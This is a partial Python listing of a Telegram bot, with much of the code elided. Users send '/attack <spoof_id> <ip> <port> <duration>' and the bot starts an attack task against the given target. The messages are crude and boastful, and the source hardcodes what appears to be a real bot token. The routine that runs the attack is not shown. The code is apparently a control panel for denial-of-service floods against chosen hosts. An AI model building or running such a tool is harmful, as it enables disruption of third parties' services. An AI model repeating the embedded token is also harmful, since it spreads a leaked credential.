...
TELEGRAM_BOT_TOKEN = '7252565213:AAGhR0Xq6OpWFWAeIAPIWjYmtCpITvz_s_0'
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        ...
        "*Use /attack <spoof_id> <ip> <port> <duration>*\n"
        "*Let Start Fucking ⚔️💥*"
    )
...
async def run_attack(chat_id, ip, port, duration, context, spoof_id):
...
async def attack(update: Update, context: CallbackContext):
    ...
    if len(args) != 4:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <spoof_id> <ip> <port> <duration>*", parse_mode='Markdown')
        return

    spoof_id, ip, port, duration = args
    ...
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context, spoof_id))
